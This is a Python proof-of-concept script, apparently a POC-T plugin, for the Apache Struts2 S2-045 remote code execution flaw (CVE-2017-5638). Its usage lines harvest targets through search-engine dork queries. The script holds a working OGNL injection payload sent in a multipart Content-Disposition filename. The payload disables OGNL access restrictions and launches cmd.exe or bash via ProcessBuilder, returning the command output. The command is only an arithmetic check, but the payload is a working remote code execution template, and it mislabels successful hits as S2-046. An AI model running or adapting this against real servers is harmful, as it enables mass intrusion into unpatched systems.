#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = 24''

"""
Struts2 S2-045 Remote Code Execution PoC (CVE-2017-5638)

Version:
2.3.5-2.3.31, 2.5-2.5.10

Usage:
python POC-T.py -s struts2-s2045 -aG "inurl:login.action" --gproxy "http 127.0.0.1 1080"
python POC-T.py -s struts2-s2045 -aZ "login.action"
python POC-T.py -s struts2-s2045 -iF FILE.txt
"""

import requests
import random


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    try:
        a = random.randint(10000000, 20000000)
        b = random.randint(10000000, 20000000)
        c = a + b
        win = 'set /a ' + str(a) + ' + ' + str(b)
        linux = 'expr ' + str(a) + ' + ' + str(b)

        boundary = "---------------------------735323031399963166993862150"
        paylaod = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#iswin?(#cmd='" + \
            win + "'):(#cmd='" + linux + "')).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

        headers = {
            'Content-Type': 'multipart/form-data; boundary=' + boundary + ''}
        data = "--" + boundary + "\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"" + \
            paylaod + "\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--" + boundary + "--"
               
        r = requests.post(url, headers=headers, data=data, timeout=15)       
        if str(c) in r.text:
            return '[S2-046]' + url
        else:
            return False
    except Exception:
        return False
